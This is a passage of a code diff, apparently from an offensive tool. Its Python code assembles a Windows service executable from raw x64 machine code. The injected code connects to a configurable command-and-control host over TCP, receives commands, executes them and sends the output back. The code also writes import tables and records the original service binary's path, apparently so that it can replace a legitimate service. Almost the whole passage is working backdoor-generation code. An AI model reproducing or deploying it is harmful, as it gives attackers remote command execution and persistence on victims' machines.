+                # Return
+                0x33,
+                0xC0,  # xor eax, eax
+                0x48,
+                0x83,
+                0xC4,
+                0x48,  # add rsp, 48h
+                0xC3,  # ret
+                # C2Thread function
+                # [0x700]
+                0x48,
+                0x83,
+                0xEC,
+                0x38,  # sub rsp, 38h
+                # Load ws2_32.dll
+                0x48,
+                0x8D,
+                0x0D,
+                0x80,
+                0x20,
+                0x00,
+                0x00,  # lea rcx, [ws2_32_dll]
+                0xFF,
+                0x15,
+                0x60,
+                0x20,
+                0x00,
+                0x00,  # call [LoadLibraryA]
+                # Initialize Winsock
+                0x48,
+                0x8D,
+                0x54,
+                0x24,
+                0x40,  # lea rdx, [rsp+40h]
+                0xB9,
+                0x02,
+                0x02,
+                0x00,
+                0x00,  # mov ecx, 0x0202
+                0xFF,
+                0x15,
+                0x70,
+                0x20,
+                0x00,
+                0x00,  # call [WSAStartup]
+                # Create socket
+                0x41,
+                0xB8,
+                0x06,
+                0x00,
+                0x00,
+                0x00,  # mov r8d, 6 (IPPROTO_TCP)
+                0xBA,
+                0x01,
+                0x00,
+                0x00,
+                0x00,  # mov edx, 1 (SOCK_STREAM)
+                0xB9,
+                0x02,
+                0x00,
+                0x00,
+                0x00,  # mov ecx, 2 (AF_INET)
+                0xFF,
+                0x15,
+                0x80,
+                0x20,
+                0x00,
+                0x00,  # call [socket]
+                0x48,
+                0x89,
+                0xC3,  # mov rbx, rax (save socket)
+                # Connect to C2
+                0x41,
+                0xB8,
+                0x10,
+                0x00,
+                0x00,
+                0x00,  # mov r8d, 16
+                0x48,
+                0x8D,
+                0x15,
+                0x00,
+                0x33,
+                0x00,
+                0x00,  # lea rdx, [c2_sockaddr]
+                0x48,
+                0x8B,
+                0xCB,  # mov rcx, rbx
+                0xFF,
+                0x15,
+                0x90,
+                0x20,
+                0x00,
+                0x00,  # call [connect]
+                # Command loop
+                # [0x780]
+                0x48,
+                0x8D,
+                0x54,
+                0x24,
+                0x50,  # lea rdx, [rsp+50h] (recv buffer)
+                0x41,
+                0xB9,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov r9d, 0
+                0x41,
+                0xB8,
+                0x00,
+                0x04,
+                0x00,
+                0x00,  # mov r8d, 1024
+                0x48,
+                0x8B,
+                0xCB,  # mov rcx, rbx
+                0xFF,
+                0x15,
+                0xA0,
+                0x20,
+                0x00,
+                0x00,  # call [recv]
+                # Check for commands and execute
+                0x85,
+                0xC0,  # test eax, eax
+                0x7E,
+                0x20,  # jle disconnect
+                # Parse and execute command
+                0x48,
+                0x8D,
+                0x4C,
+                0x24,
+                0x50,  # lea rcx, [rsp+50h]
+                0xE8,
+                0x00,
+                0x04,
+                0x00,
+                0x00,  # call ExecuteCommand
+                # Send response
+                0x41,
+                0xB9,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov r9d, 0
+                0x44,
+                0x8B,
+                0xC0,  # mov r8d, eax
+                0x48,
+                0x8D,
+                0x54,
+                0x24,
+                0x50,  # lea rdx, [rsp+50h]
+                0x48,
+                0x8B,
+                0xCB,  # mov rcx, rbx
+                0xFF,
+                0x15,
+                0xB0,
+                0x20,
+                0x00,
+                0x00,  # call [send]
+                # Loop back
+                0xEB,
+                0xCA,  # jmp command_loop
+                # disconnect:
+                0x48,
+                0x8B,
+                0xCB,  # mov rcx, rbx
+                0xFF,
+                0x15,
+                0xC0,
+                0x20,
+                0x00,
+                0x00,  # call [closesocket]
+                # Cleanup
+                0xFF,
+                0x15,
+                0xD0,
+                0x20,
+                0x00,
+                0x00,  # call [WSACleanup]
+                0x33,
+                0xC0,  # xor eax, eax
+                0x48,
+                0x83,
+                0xC4,
+                0x38,  # add rsp, 38h
+                0xC3,  # ret
+            ]
+        )
+
+        pe_file[0x400 : 0x400 + len(service_main_code)] = service_main_code
+
+        # Write import table at 0x1400 (.rdata section)
+        # Import descriptors
+        import_descriptors = []
+
+        # kernel32.dll imports
+        kernel32_desc = struct.pack(
+            "<IIIII",
+            0x3080,  # OriginalFirstThunk (INT)
+            0,  # TimeDateStamp
+            0,  # ForwarderChain
+            0x3300,  # Name RVA
+            0x3180,  # FirstThunk (IAT)
+        )
+        import_descriptors.append(kernel32_desc)
+
+        # advapi32.dll imports
+        advapi32_desc = struct.pack(
+            "<IIIII",
+            0x30A0,  # OriginalFirstThunk
+            0,  # TimeDateStamp
+            0,  # ForwarderChain
+            0x3320,  # Name RVA
+            0x31A0,  # FirstThunk
+        )
+        import_descriptors.append(advapi32_desc)
+
+        # ws2_32.dll imports
+        ws2_32_desc = struct.pack(
+            "<IIIII",
+            0x30C0,  # OriginalFirstThunk
+            0,  # TimeDateStamp
+            0,  # ForwarderChain
+            0x3340,  # Name RVA
+            0x31C0,  # FirstThunk
+        )
+        import_descriptors.append(ws2_32_desc)
+
+        # Null terminator
+        import_descriptors.append(b"\x00" * 20)
+
+        offset = 0x1400
+        for desc in import_descriptors:
+            pe_file[offset : offset + len(desc)] = desc
+            offset += len(desc)
+
+        # Write DLL names at 0x1500
+        dll_names = [
+            b"kernel32.dll\x00",
+            b"advapi32.dll\x00",
+            b"ws2_32.dll\x00",
+        ]
+
+        offset = 0x1500
+        for name in dll_names:
+            pe_file[offset : offset + len(name)] = name
+            offset += len(name)
+
+        # Write service name and config at 0x1A00 (.data section)
+        service_name = service_info.get("name", "Service").encode("ascii")[:63] + b"\x00"
+        pe_file[0x1A00 : 0x1A00 + len(service_name)] = service_name
+
+        # Write original binary path
+        original_path = original_binary_path.encode("ascii")[:255] + b"\x00"
+        pe_file[0x1A80 : 0x1A80 + len(original_path)] = original_path
+
+        # Write C2 configuration
+        c2_config = struct.pack(
+            "<HH4s",
+            0x0002,  # AF_INET
+            socket.htons(self.port),  # Port
+            socket.inet_aton(self.host),  # IP address
+        )
+        pe_file[0x1B00 : 0x1B00 + len(c2_config)] = c2_config
+
+        return bytes(pe_file)
